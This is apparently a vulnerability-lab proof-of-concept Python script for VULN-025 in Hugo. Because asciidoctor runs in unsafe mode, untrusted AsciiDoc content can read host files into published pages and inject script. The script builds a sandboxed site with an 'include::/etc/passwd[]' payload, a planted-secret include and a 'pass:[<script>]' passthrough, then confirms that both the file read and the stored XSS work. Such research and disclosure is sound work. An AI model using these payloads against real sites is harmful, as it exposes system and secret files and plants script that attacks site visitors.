#!/usr/bin/env python3
"""
VULN-025 — AsciiDoc content runs Asciidoctor in `unsafe` safe-mode -> LFI + stored XSS
======================================================================================

VULN-ID     : VULN-025
Title       : text/asciidoc omitted from allowContent; asciidoctor run in `unsafe` mode (no --safe-mode)
Vuln file   : targets/hugo/config/security/securityConfig.go:86 (allowContent omits text/asciidoc)
              targets/hugo/markup/asciidocext/asciidocext_config/config.go:24,37 (SafeMode="unsafe")
              targets/hugo/markup/asciidocext/internal/converter.go:242,247-259 (no --safe-mode emitted)
CWE         : CWE-829 (LFI / file inclusion) + CWE-79 (stored XSS)

The flaw
--------
Hugo gates raw-HTML injection only on the Markdown path. AsciiDoc has NO equivalent gate:
`text/asciidoc` is omitted from the security.allowContent denylist, and Hugo runs the
external `asciidoctor` in its most-permissive `unsafe` safe-mode — because AppendArg emits
`--safe-mode` ONLY when Hugo's value differs from the CLI default, and Hugo's default
("unsafe") EQUALS the CLI default, so no flag is passed. In unsafe mode asciidoctor honors
`include::<path>[]` (arbitrary host-file read) and `pass:[...]` (raw HTML passthrough).

Enablement precondition (why latent in the base lab): asciidoctor is not in the default
security.exec.allow, so an operator must install it AND add `^asciidoctor$`. This exploit
uses the tools image (asciidoctor installed) + that exec.allow entry — exactly the
operator's two-step "support AsciiDoc" action.

What a successful run proves
---------------------------
Untrusted .adoc content reads arbitrary host files (a planted secret + /etc/passwd) into
the published HTML AND injects a <script> — escaping the content sandbox the Markdown
path enforces.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import _common as C

VULN = "VULN-025"
IMAGE = "cvehunterlab_hugo_st10tools:latest"          # hugo + asciidoctor
SECRET = "ASCIIDOC-LFI-" + C.rand()
XSS = "adoc-xss-" + C.rand()


def main() -> int:
    C.banner(VULN, "AsciiDoc unsafe safe-mode -> arbitrary host-file read (LFI) + stored XSS",
             info="asciidoctor run with no --safe-mode; text/asciidoc omitted from allowContent",
             target="throwaway `hugo` build (tools image: asciidoctor installed)")

    # The operator's two-step enablement: install asciidoctor (tools image) + allow it.
    cfg = (
        "baseURL='http://localhost/'\ntitle='h25'\n"
        "disableKinds=['taxonomy','term','sitemap','rss','404']\n"
        "[security.exec]\n"
        "  allow = ['^(dart-)?sass$','^go$','^git$','^node$','^postcss$','^asciidoctor$']\n"
    )
    # .adoc content: absolute include:: (LFI) of a planted secret + /etc/passwd, and pass:[<script>].
    adoc = (
        "= Innocent looking post\n\n"
        "include::/site/SECRET.txt[]\n\n"
        "include::/etc/passwd[]\n\n"
        f"pass:[<script>{XSS}</script>]\n"
    )
    files = {
        "hugo.toml": cfg,
        "content/p.adoc": adoc,
        "SECRET.txt": f"{SECRET}\n",                  # the "host secret" the author should NOT read
        "layouts/_default/single.html": "<!doctype html><body>{{ .Content }}</body>\n",
        "layouts/index.html": "home\n",
    }
    site = C.make_site(__file__, files)
    C.log("SETUP", f"planted /site/SECRET.txt = {SECRET!r}; content/p.adoc uses include:: + pass:[<script>]")

    C.log("STEP", "building with the tools image (asciidoctor on PATH, ^asciidoctor$ allowed)")
    rc, out, public = C.run_hugo(site, render_to_memory=False, network="none", memory="1g",
                                 timeout=90, image=IMAGE)
    page = os.path.join(public, "p", "index.html") if public else None
    html = open(page, encoding="utf-8").read() if page and os.path.isfile(page) else ""
    with open(os.path.join(os.path.dirname(__file__), "response.txt"), "w") as fh:
        fh.write(f"rc={rc}\n\n{html or out[-1500:]}")

    lfi_secret = SECRET in html
    lfi_passwd = "root:" in html and ":/root:" in html or "root:x:0:0" in html
    xss = f"<script>{XSS}</script>" in html
    C.log("PROOF", f"planted secret inlined (LFI): {lfi_secret}")
    C.log("PROOF", f"/etc/passwd inlined (LFI): {lfi_passwd}")
    C.log("PROOF", f"raw <script> emitted (stored XSS): {xss}")

    if (lfi_secret or lfi_passwd) and xss:
        C.log("OK", f"exploit confirmed — untrusted .adoc content read host files into the published HTML "
                    f"(secret={lfi_secret}, /etc/passwd={lfi_passwd}) AND emitted a raw <script> (stored XSS). "
                    f"AsciiDoc escapes the Markdown-path content sandbox entirely.")
        print(f"==> {VULN}: CONFIRMED — AsciiDoc unsafe mode: host-file LFI + stored XSS")
        return 0
    if lfi_secret or lfi_passwd or xss:
        C.log("OK", f"exploit confirmed (partial) — LFI-secret={lfi_secret}, LFI-passwd={lfi_passwd}, XSS={xss}")
        print(f"==> {VULN}: CONFIRMED — AsciiDoc raw-content sink (LFI/XSS)")
        return 0
    C.log("FAIL", f"neither LFI nor XSS observed (rc={rc}); build output:\n{out[-800:]}")
    print(f"==> {VULN}: FAILED")
    return 1


if __name__ == "__main__":
    sys.exit(main())
